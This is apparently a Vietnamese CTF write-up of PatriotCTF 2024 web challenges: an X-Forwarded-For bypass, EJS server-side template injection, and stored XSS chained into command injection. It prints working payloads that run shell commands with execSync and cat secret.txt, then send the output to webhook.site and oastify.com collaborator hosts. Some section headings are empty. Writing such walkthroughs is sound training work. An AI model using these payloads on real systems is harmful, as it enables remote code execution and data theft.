# Web Challenge

## Web: giraffe notes (Easy)

Trang web hiển thị giao diện như hình bên dưới

![img1](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-01.png?raw=true)

Trang web được cung cấp source tôi chú ý đến đoạn code `php` này

```
<?php
$allowed_ip = ['localhost', '127.0.0.1'];

if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $allowed_ip)) {
    $allowed = true;
} else {
    $allowed = false;
}
?>
```

Đoạn code đang kiểm tra xem địa chỉ IP của người dùng có nằm trong danh sách các `ip` cho phép hay không, dựa trên giá trị `HTTP_X_FORWARDED_FOR`

Vì vậy tôi sẽ sử dụng thêm `header` `X-Forwarded-For: 127.0.0.1` - là một `HTTP header` được sử dụng để ghi lại địa chỉ IP ban đầu của client khi một yêu cầu HTTP được gửi qua `proxy` hoặc `load balancer`, ở đây nó sẽ mang giá trị `127.0.0.1`

![img2](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-02.png?raw=true)

> Flag: CACI{1_lik3_g1raff3s_4_l0t}

## Web: Blob (Medium)

Đây là giao diện của trang thử thách

![img5](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-05.png?raw=true)

Thử thách vẫn cho ta một đoạn code `js` như sau:

```
require("express")()
  .set("view engine", "ejs")
  .use((req, res) => res.render("index", { blob: "blob", ...req.query }))
  .listen(3000);
```

Đoạn code là một ứng dụng `Express` đơn giản sử dụng `EJS` (Embedded JavaScript) làm `engine` để `render` các `view`

- Thiết Lập Engine EJS: **.set("view engine", "ejs")**

- **.use((req, res) => res.render("index", { blob: "blob", ...req.query }))**

  - Đoạn mã này sử dụng một `middleware` để xử lý tất cả các yêu cầu. Nó sẽ `render` một `view` có tên là `index` và truyền vào một `object` chứa:

        - blob: một biến có giá trị là chuỗi` "blob".

    ...req.query`: sẽ lấy tất cả các query parameters từ URL và thêm chúng vào object. Ví dụ: nếu URL là http://localhost:3000/?name=Giang&age=21, thì req.query sẽ chứa { name: 'Giang', age: '21' }`

Nói đến vuln render template chúng ta nghĩ đến ngay `SSTI` nhưng ở đây là `ejs` `SSTI` , có thể tham khảo bài viết ở [https://eslam.io/posts/ejs-server-side-template-injection-rce/](https://eslam.io/posts/ejs-server-side-template-injection-rce/)

Vì vậy tôi sẽ thực thi `payload` nhằm lấy nội dung của file `flag.txt` có thể nó sẽ đi kèm là `flag-xxxx.txt` nhắm bắt tìm ra file chuẩn, sau đó tôi gửi đến một `webhook`

```
http://chal.competitivecyber.club:3000/?settings[view%20options][outputFunctionName]=x%0Afetch(%60https://webhook.site/5974a063-c2a8-4009-8b57-a04f8a165d36?flag=$%7Bprocess.mainModule.require(%27child_process%27).execSync(%27cat%20flag.txt%27).toString()%7D%60)%0As
```

![img-06](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-06.png?raw=true)

> outputFunctionName is not a valid JS identifier

Sau một hồi tìm kiếm, tôi tìm được payload khác ở [https://github.com/mde/ejs/issues/735](https://github.com/mde/ejs/issues/735) có lẽ đây là phiển bản `EJS` cao hơn và chưa được cập nhật bản vá

```
http://chal.competitivecyber.club:3000/?settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20fetch(`https://webhook.site/5974a063-c2a8-4009-8b57-a04f8a165d36?flag=${process.mainModule.require('child_process').execSync('ls').toString()}`)
```

> Flag: CACI{bl0b_s4y_pl3453l00k0utf0rpr0707yp3p0llut10n}

## Web: Impersonate (Medium)

## Web: DOMDOM (Easy)

## Web: Open Seasame (Easy)

Trang web hiển thị giao diện như hình bên dưới

![img3](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-03.png?raw=true)

Trang web yêu cầu nhập vào một path thuộc địa chỉ ip `127.0.0.1` với `port` đang mở là `13337` có thể liên quan đến lỗ hổng `XSS` , `SSRF`

Thử thách cung cấp 2 file `source` là `server.py` và `admin.js`

Đối với file `server.py` có thể thấy server dùng framework `flask` của python, với đoạn code đầu tiên

```
app = Flask(__name__)
SECRET = open("secret.txt", "r").read()
stats = []
```

- Đầu tiên khởi tạo một object Flask để quản lý các route, sau đó nó sẽ đọc file `secret.txt` và gán cho biến `SECRET`

- Tiếp theo là 1 mảng `stats`

Tiếp theo ở một số `api`, tôi đặc biệt chú ý đến `api` `/api/cal`

```
@app.route('/api/cal', methods=['GET'])
def get_cal():
    cookie = request.cookies.get('secret')
    if cookie == None:
        return '{"error": "Unauthorized"}'

    if cookie != SECRET:
        return '{"error": "Unauthorized"}'

    modifier = request.args.get('modifier','')

    return '{"cal": "'+subprocess.getoutput("cal "+modifier)+'"}'
```

- Đầu tiên đoạn code lấy giá trị `cookie` có tên `secret` ở phần đầu của file. Nếu giá trị `cookie` không tồn tại hoặc không bằng với giá trị `SECRET` thì trả về `{"error": "Unauthorized"}` (chưa được xác thực).
- Tiếp theo, đoạn code lấy giá trị `modifier` từ `request.args.get('modifier')`, sau đó thực hiện lệnh `cal` với `modifier` khi mà người dùng đã được xác thực thông qua `cookie`
- Kết quả lệnh được trả về dưới dạng `JSON`, chứa dữ liệu của `cal`.

-> có thể chỉ định `admin bot` truy cập đến `endpoint` là` /api/cal` để trả về dữ liệu của lệnh `cal`, đó có thể là nơi chứa `flag`

Hai api còn lại là việc trả về dữ liệu của người dùng thông qua `id` và thêm dữ liệu vào trong mảng `stats` thông qua `/api/stats`

Vì trang web sử dụng `admin bot` để xác thực nên tôi đọc tiếp file `admin.js`

```
 if (url.includes("cal") || url.includes("%")) {
    res.send('Error: "cal" is not allowed in the URL');
    return;
}
```

Ở đoạn code này server xử lí khi URL có chứa `cal` hoặc `%` thì sẽ trả về `'Error: "cal" is not allowed in the URL'`, bằng chứng là khi tôi test thử như sau:

![img4](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-04.png?raw=true)

Vậy thì chúng ta không thể `inject` thông qua `/api/cal` vì sẽ được `server` kiểm tra và không thể thực thi, tôi nghĩ đến tấn công vào `api` là `/api/stats` với 2 trường tham số bổ sung là `username` và `high_score` sau đó `server` sẽ xử lí và trả về `id`, sau đó yêu cầu `admin bot` truy cập đến `/api/stats/id` để lấy data tương ứng với `id` này

- Vì vậy giá trị của tham số `username` sẽ được truyền vào để thực hiện function `add_stats`

  ```
  @app.route('/api/stats', methods=['POST'])
  def add_stats():
      try:
          username = request.json['username']
          high_score = int(request.json['high_score'])
      except:
          return '{"error": "Invalid request"}'

      id = str(uuid.uuid4())

      stats.append({
          'id': id,
          'data': [username, high_score]
      })
      return '{"success": "Added", "id": "'+id+'"}'
  ```

- Tôi test thử chức năng tạo ra một `id` mới, gửi request đến /api/stats với các trường `username` và `high_score` bổ sung

  ![img07](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-07.png?raw=true)

- Bây giờ tôi sẽ sử dụng `Burp Collaborator`,một cách đơn giản, `Burp Collaborator` là một máy chủ có thể nhận yêu cầu qua nhiều giao thức (ví dụ: HTTP, HTTPS, DNS hoặc SMTP). Nó cho phép phát hiện các lỗ hổng không biểu hiện trong các phản hồi trực tiếp nhận được từ ứng dụng mục tiêu mà thay vào đó xuất hiện trong các kết nối do ứng dụng khởi tạo với các hệ thống khác, đó là lý do tại sao chúng được gọi là lỗ hổng ngoài băng tần(`out-of-band`)

  ```
  mukf2yv9x6l6hzto5team5bjkaq1es2h.oastify.com
  http://mukf2yv9x6l6hzto5team5bjkaq1es2h.oastify.com
  ```

- Tôi thực hiện `payload` như sau:

  ```
  {"username":
  "<script>fetch('/api/cal?modifier=;cat secret.txt').then(response => response.text()).then(data => {var img = new Image(); img.src = 'http://mukf2yv9x6l6hzto5team5bjkaq1es2h.oastify.com/?data=' + encodeURIComponent(data);});</script>","high_score":2024}
  ```

- Tôi gửi request đến `/api/stats` với `payload` trên, sau đó đi đến `/api/stats` với `id` mới được thêm mới:

  ![img10](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-10.png?raw=true)

  ![img11](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-11.png?raw=true)

- Sau đó, bot truy cập UUID:

  ![img12](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-12.png?raw=true)

- Kiểm tra tham số data được gắn kèm trên URL của request `Burp Collaborator` sẽ thấy được cookie trả về

  ![img13](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-13.png?raw=true)

  ```
  {"cal": "   September 2024
  Su Mo Tu We Th Fr Sa
  1  2  3  4  5  6  7
  8  9 10 11 12 13 14
  15 16 17 18 19 20 21
  22 23 24 25 26 27 28
  29 30

  FDJtFLydO3dojOCrKj1mJiN0NYJW2OLx4rRUZCp5gMxi6wTszhb7NkC7idQ1E1J9WCbU0zOujetQbkIuhSNUf9uwsdOi5vlnz0ngid0ifXfoe78PA3D7KM1LpKnr6iLp"}
  ```

- Gửi kèm cookie đó để lấy `flag`

  ![img15](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-15.png?raw=true)

> Flag: CACI{1_l0v3_c0mm4nd_1nj3ct10n}

## Impersonate
